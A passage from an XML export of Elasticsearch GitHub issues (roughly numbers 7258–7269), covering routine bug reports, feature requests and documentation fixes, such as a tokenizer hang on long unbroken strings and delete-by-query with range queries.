</description><key id="40214470">7269</key><summary>Introduced a new elasticsearch exception family that can hold headers</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>:Exceptions</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-14T01:00:53Z</created><updated>2015-06-07T12:24:19Z</updated><resolved>2014-08-14T10:38:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-08-14T07:17:38Z" id="52151215">Why not doing an own interface like `Headerizable` here, that any exception can possibly implement (still working on my naming skills, but you get the point)? 
</comment><comment author="uboness" created="2014-08-14T08:44:26Z" id="52157721">@spinscale thought about it as well (though I must say the name `Headerizable` never crossed my mind :D)... had it initially, then removed it, I can add it again, but I still want to keep the `WithHeaders` construct (that can implement `HasHeaders`)
</comment><comment author="jpountz" created="2014-08-14T08:45:58Z" id="52157856">What about having it on the ElasticsearchException class directly?
</comment><comment author="uboness" created="2014-08-14T09:35:16Z" id="52162960">@jpountz I'm afraid it'll break serialization bwc, but also I'm not sure every es exception should have it
</comment><comment author="jpountz" created="2014-08-14T10:08:38Z" id="52165991">OK, good points. I left some comments but other than that it looks good to me.
</comment><comment author="uboness" created="2014-08-14T10:30:12Z" id="52167760">updated based on @jpountz comments
</comment><comment author="jpountz" created="2014-08-14T10:31:28Z" id="52167876">LGTM
</comment><comment author="uboness" created="2014-08-14T10:38:55Z" id="52168470">merged by f4a7793f89b6ffd40d27f50c230c1361d1f9884f
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Should the default position_offset_gap be higher then 0?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7268</link><project id="" key="" /><description>The default value of `position_offset_gap` can cause phrase matches across multiple field values.  I _think_ that is generally not what people want.  Can it default to `10` or something?
</description><key id="40199851">7268</key><summary>Should the default position_offset_gap be higher then 0?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">nik9000</reporter><labels><label>:Mapping</label><label>enhancement</label><label>feature</label><label>v2.0.0-beta2</label></labels><created>2014-08-13T21:12:38Z</created><updated>2015-11-22T10:19:04Z</updated><resolved>2015-08-25T22:01:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-14T09:00:18Z" id="52159220">++
</comment><comment author="pschanely" created="2015-06-01T19:04:44Z" id="107672732">Agreed.  I don't know a ton about the internals, but I suspect the only possible low-level impact of increasing this by default is that we might overflow the vint used to store the offset, making the index slightly larger?  If so, I'd think a modest gap of 10 should still be safe, right?
</comment><comment author="nik9000" created="2015-08-25T20:07:08Z" id="134722364">Almost there - I've merged #12544 to 2.0 and master but I'll need another small tweak to master to make it compatible with the 2.0. I should have developed this against 2.0 and forward ported it to master. I did the opposite. But it'll be ok.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Docs: Fixed a typo</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7267</link><project id="" key="" /><description>I read that so many times, I just couldn't stand the typo anymore :)
Thanks!
</description><key id="40199220">7267</key><summary>Docs: Fixed a typo</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">omikronn</reporter><labels><label>docs</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T21:05:43Z</created><updated>2014-09-08T18:56:21Z</updated><resolved>2014-08-14T14:27:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-08-14T08:33:53Z" id="52156869">Hi @omikronn, thanks for the correction! Can you sign the [CLA](http://www.elasticsearch.org/contributor-agreement/) and I'll merge this in?
</comment><comment author="omikronn" created="2014-08-14T14:24:16Z" id="52189578">Hey @dakrone I just did. That felt so official, now I feel committed to actually contributing with some code :)) Thanks a lot!
</comment><comment author="dakrone" created="2014-08-14T14:27:12Z" id="52189990">Merged, thanks for the contribution :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Elasticsearch hangs on input containing a huge string without spaces</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7266</link><project id="" key="" /><description>When the input for indexing contains a huge string without spaces, Elasticsearch hangs without responding to the request. I was expecting either to discard or truncate the token or get an error response instead of server hanging. All subsequent valid requests to the server also times out. 

Steps to reproduce
1. Create a  test index using default so that the standard analyzer is used.
2. Send the attached document to index
    curl -XPUT localhost:9200/test/test/1 -d @bad_input.json

I couldn't find a way to attach a file to the bug, so I am sharing the link to the file bad_input.json file on google drive.

https://drive.google.com/file/d/0B4p5T-L62D0SR3dXMDlxemUweU0/edit?usp=sharing
</description><key id="40193366">7266</key><summary>Elasticsearch hangs on input containing a huge string without spaces</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/rmuir/following{/other_user}', u'events_url': u'https://api.github.com/users/rmuir/events{/privacy}', u'organizations_url': u'https://api.github.com/users/rmuir/orgs', u'url': u'https://api.github.com/users/rmuir', u'gists_url': u'https://api.github.com/users/rmuir/gists{/gist_id}', u'html_url': u'https://github.com/rmuir', u'subscriptions_url': u'https://api.github.com/users/rmuir/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/504194?v=4', u'repos_url': u'https://api.github.com/users/rmuir/repos', u'received_events_url': u'https://api.github.com/users/rmuir/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/rmuir/starred{/owner}{/repo}', u'site_admin': False, u'login': u'rmuir', u'type': u'User', u'id': 504194, u'followers_url': u'https://api.github.com/users/rmuir/followers'}</assignee><reporter username="">athanikkal</reporter><labels><label>bug</label></labels><created>2014-08-13T20:04:11Z</created><updated>2015-04-23T00:18:33Z</updated><resolved>2015-04-22T21:29:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-08-13T20:50:17Z" id="52108881">Best way to add stuff to the bug is to post it as a gist.  The best gists are those that as bash scripts that recreate the problem with curl.  
</comment><comment author="imotov" created="2014-08-14T00:44:09Z" id="52131040">It's reproducible. It looks like it's getting stuck in standard tokenizer:

```

   100.3% (501.4ms out of 500ms) cpu usage by thread 'elasticsearch[Justine Hammer][index][T#1]'
     10/10 snapshots sharing following 21 elements
       org.apache.lucene.analysis.standard.StandardTokenizerImpl.getNextToken(StandardTokenizerImpl.java:1255)
       org.apache.lucene.analysis.standard.StandardTokenizer.incrementToken(StandardTokenizer.java:180)
       org.apache.lucene.analysis.standard.StandardFilter.incrementToken(StandardFilter.java:49)
       org.apache.lucene.analysis.core.LowerCaseFilter.incrementToken(LowerCaseFilter.java:54)
       org.apache.lucene.analysis.util.FilteringTokenFilter.incrementToken(FilteringTokenFilter.java:82)
       org.apache.lucene.index.DefaultIndexingChain$PerField.invert(DefaultIndexingChain.java:604)
       org.apache.lucene.index.DefaultIndexingChain.processField(DefaultIndexingChain.java:342)
       org.apache.lucene.index.DefaultIndexingChain.processDocument(DefaultIndexingChain.java:301)
       org.apache.lucene.index.DocumentsWriterPerThread.updateDocument(DocumentsWriterPerThread.java:222)
       org.apache.lucene.index.DocumentsWriter.updateDocument(DocumentsWriter.java:450)
       org.apache.lucene.index.IndexWriter.updateDocument(IndexWriter.java:1507)
       org.apache.lucene.index.IndexWriter.addDocument(IndexWriter.java:1222)
       org.elasticsearch.index.engine.internal.InternalEngine.innerIndex(InternalEngine.java:563)
       org.elasticsearch.index.engine.internal.InternalEngine.index(InternalEngine.java:492)
       org.elasticsearch.index.shard.service.InternalIndexShard.index(InternalIndexShard.java:417)
       org.elasticsearch.action.index.TransportIndexAction.shardOperationOnPrimary(TransportIndexAction.java:196)
       org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction.performOnPrimary(TransportShardReplicationOperationAction.java:523)
       org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1.run(TransportShardReplicationOperationAction.java:422)
       java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
       java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
       java.lang.Thread.run(Thread.java:724)
```
</comment><comment author="clintongormley" created="2014-08-14T09:03:16Z" id="52159600">I think this is a known problem with the standard tokenizer.  /cc @rmuir ?
</comment><comment author="rmuir" created="2014-08-14T12:15:15Z" id="52175655">Its not a known problem, I will look into it.
</comment><comment author="rmuir" created="2014-08-20T17:39:42Z" id="52813538">I opened https://issues.apache.org/jira/browse/LUCENE-5897

Thank you for reporting this.
</comment><comment author="athanikkal" created="2014-08-21T00:36:21Z" id="52864568">Thank you.
</comment><comment author="rmuir" created="2014-08-23T02:33:05Z" id="53140356">The generated code from jflex has been patched for this case in the upcoming lucene 4.10 release.
</comment><comment author="imotov" created="2015-04-22T19:08:22Z" id="95306820">@rmuir since v1.3.3 and v1.4.0 were released with Lucene 4.9.1, 4.10 respectively, should we close this issue?
</comment><comment author="rmuir" created="2015-04-22T21:29:21Z" id="95343529">Yeah, lets close it. Thanks @athanikkal for reporting this one!
</comment><comment author="athanikkal" created="2015-04-23T00:18:33Z" id="95373552">Thank you @rmuir for fixing this.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Different interpretation of boolean config values</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7265</link><project id="" key="" /><description>I realized that configuration values "node.master" and "node.data" are case sensitive. Moreover in one place in code only exact value "true" is interpreted as boolean true.

Class DiscoveryNode reads both properties two times. Once calls appear in nodeRequiresLocalStorage, and second time in dataNode and masterNode methods.

In nodeRequiresLocalStorage method Settings.getAsBoolean is called but in second and third case only Settings.get is called and then value compared with "equals" to String "true".

I think values shouldn't work different in different places. Second thing is that probably Boolean values shouldn't be case sensitive.
</description><key id="40193132">7265</key><summary>Different interpretation of boolean config values</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">prog8</reporter><labels><label>:Settings</label><label>adoptme</label><label>bug</label></labels><created>2014-08-13T20:01:43Z</created><updated>2016-11-25T18:30:54Z</updated><resolved>2016-11-25T18:30:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="quasipedia" created="2014-12-17T11:17:03Z" id="67308834">I'm only 93% confident my bug report should be included here, if no,t just tell me and I will open a new issue...

The problem I am facing is that on uploading an index template, the boolean values get converted to strings if pertaining to the `settings` section, while treated as boolean when in the `mappings`.  Examples (the `-` refers to the template I send, the `+` to the one I get back from ES after my upload).

```
-        "index.store.compress.stored": true, 
-        "index.store.compress.tv": true
+        "index.store.compress.stored": "true", 
+        "index.store.compress.tv": "true"
```

but at the same time:

```
-        "_source": {"compress": true, "enabled": true}
+        "_source": {"compress": true, "enabled": true}
```

This is very annoying as it makes unnecessarily difficult to check if a template on a server differs from a master copy held locally on file, for example.
</comment><comment author="clintongormley" created="2014-12-17T12:42:13Z" id="67316777">@quasipedia good question...  at the moment, settings are strings and there is no getting around that.  I'm wondering if, as part of the great settings rewrite (https://github.com/elasticsearch/elasticsearch/issues/6732) this can be changed or not...
</comment><comment author="clintongormley" created="2016-11-25T18:30:54Z" id="263008656">Boolean parsing of settings is now strict.  Closing</comment></comments><attachments /><subtasks /><customfields /></item><item><title>docs: "recovery" is missing from glossary</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7264</link><project id="" key="" /><description>At time of writing, http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/glossary.html makes no mention of the term 'recovery'. Would be lovely to have this documented for users (myself included).
</description><key id="40190859">7264</key><summary>docs: "recovery" is missing from glossary</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/debadair/following{/other_user}', u'events_url': u'https://api.github.com/users/debadair/events{/privacy}', u'organizations_url': u'https://api.github.com/users/debadair/orgs', u'url': u'https://api.github.com/users/debadair', u'gists_url': u'https://api.github.com/users/debadair/gists{/gist_id}', u'html_url': u'https://github.com/debadair', u'subscriptions_url': u'https://api.github.com/users/debadair/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/362578?v=4', u'repos_url': u'https://api.github.com/users/debadair/repos', u'received_events_url': u'https://api.github.com/users/debadair/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/debadair/starred{/owner}{/repo}', u'site_admin': False, u'login': u'debadair', u'type': u'User', u'id': 362578, u'followers_url': u'https://api.github.com/users/debadair/followers'}</assignee><reporter username="">jordansissel</reporter><labels><label>adoptme</label><label>docs</label></labels><created>2014-08-13T19:37:31Z</created><updated>2016-01-15T12:41:20Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Remove phrase duplication in api-conventions.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7263</link><project id="" key="" /><description /><key id="40190115">7263</key><summary>Remove phrase duplication in api-conventions.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">charkost</reporter><labels><label>docs</label></labels><created>2014-08-13T19:29:21Z</created><updated>2014-08-18T11:01:48Z</updated><resolved>2014-08-18T11:01:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Fix typo in phrase-suggest.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7262</link><project id="" key="" /><description /><key id="40188759">7262</key><summary>Fix typo in phrase-suggest.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">charkost</reporter><labels><label>docs</label></labels><created>2014-08-13T19:14:50Z</created><updated>2014-08-18T11:01:01Z</updated><resolved>2014-08-18T11:01:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Optionally include 'Set Difference' for filter aggregation.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7261</link><project id="" key="" /><description>A project that I'm working on involves breaking down an index via many nested filter aggregations. Imagine it being for something like a website visitor funnel: 
1. Of all the visitors, bucket the ones who created an account
2. Of account creators, bucket those over age 30
3. etc.. 

What I also end up doing are creating the Difference filters, albeit manually.

1b. Of all the visitors, bucket the ones who didn't create an account.
2b. Of those account creators under 30, show me those who liked dogs.
3b. etc..

This has proven very powerful for segmenting data, but it is very verbose and error prone to create all these 'difference' filters manually. What would be great is if I could optionally have the difference filter created for me whenever I create a filter.

For example, in the filter agg doc it suggests:

```
{
    "aggs" : {
        "in_stock_products" : {
            "filter" : { "range" : { "stock" : { "gt" : 0 } } },
            "aggs" : {
                "avg_price" : { "avg" : { "field" : "price" } }
            }
        }
    }
}
```

What if we allowed a parameter on the filter agg like:

```
"filter" : { "range" : { "stock" : { "gt" : 0 } }, includeDifference: true },
```

And that would automatically create a bucket that includes all the docs not included in the main filter, perhaps  automatically naming it in this case 'not_in_stock_products'.

The response might then look like:

```
{
    ...

    "aggs" : {
        "in_stock_products" : {
            "doc_count" : 100,
            "avg_price" : { "value" : 56.3 }
        },
        "not_in_stock_products" : {
            "doc_count" : 50
        }
    }
}
```

creating further sub-aggs on the auto-created agg could be done either inline with the original agg:

```
            "filter" : { "range" : { "stock" : { "gt" : 0 } } ,
            includeDifference:true, differenceAggs: {
                "avg_price" : { "avg" : { "field" : "price" } }
            } 
            },
            "aggs" : {
                "avg_price" : { "avg" : { "field" : "price" } }
            }
```

or perhaps simply by specifying the name of the agg it would map it to the original by convention:

```
{
    "aggs" : {
        "in_stock_products" : {
            "filter" : { "range" : { "stock" : { "gt" : 0 } }  includeDifference:true},
            "aggs" : {
                "avg_price" : { "avg" : { "field" : "price" } }
            }
        },
        "not_in_stock_products" : {
            "avg_price" : { "avg" : { "field" : "price" } }
        }
    }
}
```

What do people think about something like this? I'm sure I'm not the only one who tries to segment their data like this.
</description><key id="40181638">7261</key><summary>Optionally include 'Set Difference' for filter aggregation.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Kallin</reporter><labels><label>adoptme</label></labels><created>2014-08-13T18:03:04Z</created><updated>2014-10-31T14:14:49Z</updated><resolved>2014-10-31T14:14:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="Kallin" created="2014-08-15T18:21:04Z" id="52340452">I'd be happy to contribute code for this, just wonder if the feature would be welcomed.
</comment><comment author="clintongormley" created="2014-08-18T09:31:25Z" id="52470117">Hi @Kallin 

Honestly, I don't like the `includeDifference` syntax.  I'm wondering if this would be handled generically with the "other" option described in #5324
</comment><comment author="Kallin" created="2014-08-18T14:45:29Z" id="52502189">This does sounds like it has similarities to the changes suggested in the 'missing' or 'other' options, though from what I gather those were specific to terms aggregations or bucketing aggregations. In this particular case I'm concerned about filter aggregations. If there's a way that it could be rolled into some other work that would be ideal. I don't see why the 'not_*' dynamic aggregation I described above couldn't be replaced with 'other', though that issue (https://github.com/elasticsearch/elasticsearch/issues/6804) looks to have been closed. Should I push for inclusion of this in https://github.com/elasticsearch/elasticsearch/issues/5324 ?
</comment><comment author="clintongormley" created="2014-10-31T11:04:50Z" id="61245939">It does sound like the `other` bucket would be a good fit to solve this.

See https://github.com/elasticsearch/elasticsearch/issues/5324 for discussion
</comment><comment author="Kallin" created="2014-10-31T14:08:27Z" id="61264845">as long as #5324 will handle '_other' bucket on filter aggs then I'm happy to close this.
</comment><comment author="clintongormley" created="2014-10-31T14:11:43Z" id="61265320">@Kallin as I'm sure you've seen in the other thread, it's not an easy change, but we will be working on it :)
</comment><comment author="Kallin" created="2014-10-31T14:14:49Z" id="61265786">Nothing worth having ever is :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Geo: Geo-distance without distance throws an NPE</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7260</link><project id="" key="" /><description>```
GET /attractions/restaurant/_search
{
  "query": {
    "filtered": {
      "filter": {
        "geo_distance": {
        "location": {
          "lat": 40.715,
          "lon": -73.998
        }
        }
      }
    }
  }
}
```

NPE:

```
Caused by: java.lang.NullPointerException
at org.elasticsearch.common.unit.DistanceUnit$Distance.parseDistance(DistanceUnit.java:319)
at org.elasticsearch.common.unit.DistanceUnit$Distance.access$000(DistanceUnit.java:245)
at org.elasticsearch.common.unit.DistanceUnit.parse(DistanceUnit.java:162)
at org.elasticsearch.index.query.GeoDistanceFilterParser.parse(GeoDistanceFilterParser.java:147)
at org.elasticsearch.index.query.QueryParseContext.executeFilterParser(QueryParseContext.java:290)
at org.elasticsearch.index.query.QueryParseContext.parseInnerFilter(QueryParseContext.java:271)
at org.elasticsearch.index.query.FilteredQueryParser.parse(FilteredQueryParser.java:74)
at org.elasticsearch.index.query.QueryParseContext.parseInnerQuery(QueryParseContext.java:234)
at org.elasticsearch.index.query.IndexQueryParserService.innerParse(IndexQueryParserService.java:342)
at org.elasticsearch.index.query.IndexQueryParserService.parse(IndexQueryParserService.java:268)
at org.elasticsearch.index.query.IndexQueryParserService.parse(IndexQueryParserService.java:263)
at org.elasticsearch.search.query.QueryParseElement.parse(QueryParseElement.java:33)
at org.elasticsearch.search.SearchService.parseSource(SearchService.java:669)
... 9 more
```
</description><key id="40180955">7260</key><summary>Geo: Geo-distance without distance throws an NPE</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T17:55:46Z</created><updated>2014-08-14T09:34:27Z</updated><resolved>2014-08-14T09:34:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Delete by query does not work with range query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7259</link><project id="" key="" /><description>I have a corpus of 1000 documents which have 3 _timestamp ranges between 0-30, 30-60 and 60-90 
days. The 0-30 range has 334 documents, and both the 30-60 and the 60-90  each have 333 documents.I attempted to trim the index down by using the Delete by Query API with a range query.to get rid of those documents in range 60-90. When running the query as a  search:

{
  "query" :
   {
      "range" :
      {
         "_timestamp" :
         {
            "lt" : "now-1440h"
         }
      }
   }  
}

I get 333 documents yet when I run as a Delete by Query using ElasticSearch Head or using the Jest client no documents are deleted. I tried using the refresh endpoint and that did not help.
I am running this on ElasticSearch 1.1.0
</description><key id="40171093">7259</key><summary>Delete by query does not work with range query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dan-s1</reporter><labels /><created>2014-08-13T16:13:07Z</created><updated>2014-08-14T08:59:46Z</updated><resolved>2014-08-13T16:16:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-13T16:16:14Z" id="52071622">This is likely a problem with these clients not being able to send a body with a DELETE request.  You could try passing the body as the `source` query string parameter instead.
</comment><comment author="dan-s1" created="2014-08-13T17:10:22Z" id="52079002">Can you please provide an example using the query I have above?
</comment><comment author="clintongormley" created="2014-08-13T17:22:47Z" id="52080683">```
curl -XDELETE 'http://localhost:9200/myindex/_query?source=%7B%22query%22%3A%7B%22range%22%3A%7B%22timestamp%22%3A%7B%22lt%22%3A%22now-1440h%22%7D%7D%7D%7D'
```
</comment><comment author="dan-s1" created="2014-08-13T17:51:55Z" id="52084728">That still did not work in those clients. 
What I am surprised with your original response is that I can get ElasticSearch Head to delete when I submit a query_string query using a range for example:

{
  "query":
  {
       "query_string":
       {
         "query":"dt:[\"2014-05-14T00:00:00+0000\" TO \"2014-06-13T00:00:00+0000\"]"
       }
  }
}
</comment><comment author="dan-s1" created="2014-08-13T17:59:22Z" id="52085773">I also can use these clients to delete with match_all and ids queries in the body.
</comment><comment author="clintongormley" created="2014-08-13T18:40:47Z" id="52091565">In which case you probably don't have any data in the `_timestamp` field.  Either way this is not a bug. The best place to ask for help with questions like this is in the google groups forum: https://groups.google.com/forum/#!forum/elasticsearch
</comment><comment author="dan-s1" created="2014-08-13T18:45:05Z" id="52092183">Actually we have data in the _timestamp field as _timestamp is enabled in our mapping file and sorry for the typo before but this query worked:
{
"query":
{
"query_string":
{
"query":"_timestamp:[\"2014-05-14T00:00:00+0000\" TO \"2014-06-13T00:00:00+0000\"]"
}
}
}
</comment><comment author="dan-s1" created="2014-08-13T18:46:22Z" id="52092377">and this did not:
{
"query" :
{
"range" :
{
"_timestamp" :
{
"lt" : "now-1440h"
}
}
}

}

which would indicate something in the Delete by Query API does not accept all queries.
</comment><comment author="dan-s1" created="2014-08-13T18:57:45Z" id="52093921">Also one more thing. I ran the same query against a field named ingestDate which is a defined as a dateOptionalTime type in the mapping file and it always has a value and the range query in a search returned 333 documents but with delete on query it failed. The query is below:

{
"query" :
{
"range" :
{
"ingestDate" :
{
"lt" : "now-1440h"
}
}
}

}
</comment><comment author="clintongormley" created="2014-08-13T19:23:04Z" id="52097344">This works for me:

```
PUT /test 
{
  "mappings": {
    "test": {
      "_timestamp": {
        "format": "yyyy-MM-dd",
        "enabled": true
      }
    }
  }
}
PUT /test/test/1?timestamp=2015-01-01
{}

PUT /test/test/2?timestamp=2014-01-01
{}

PUT /test/test/3?timestamp=2013-01-01
{}
```

This search returns the 2nd and 3rd docs:

```
GET /_search
{
  "query": {
    "range": {
      "_timestamp": {
        "lt": "now-1440h"
      }
    }
  }
}

DELETE /test/_query 
{
  "query": {
    "range": {
      "_timestamp": {
        "lt": "now-1440h"
      }
    }
  }
}
```

This returns only the first doc:

```
GET /_search
```
</comment><comment author="rahst12" created="2014-08-13T20:37:07Z" id="52107093">@clintongormley What version of elasticsearch are you testing with?  
</comment><comment author="clintongormley" created="2014-08-14T08:59:46Z" id="52159160">Originally on master - I went back and tested this on 1.3.1, 1.2.1 and 1.1.2.... turns out this was indeed broken in the 1.1.x branch!

Looks like it was fixed by #5540
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>REST API: Cannot expand_wildcards for only closed indices</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7258</link><project id="" key="" /><description>The expand_wildcards option supports 'open', 'closed', and 'open,closed'.  If you specify 'closed' and the defaultSettings are 'open', both open and closed indices will match. This is because the defaults are pre-selected so even if only 'closed' is provided in the request, open will still be set as well. Need to change it so it only sets the defaults if the "expand_wildcards" parameter is not provided

see: https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/action/support/IndicesOptions.java#L155-168
</description><key id="40155294">7258</key><summary>REST API: Cannot expand_wildcards for only closed indices</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter 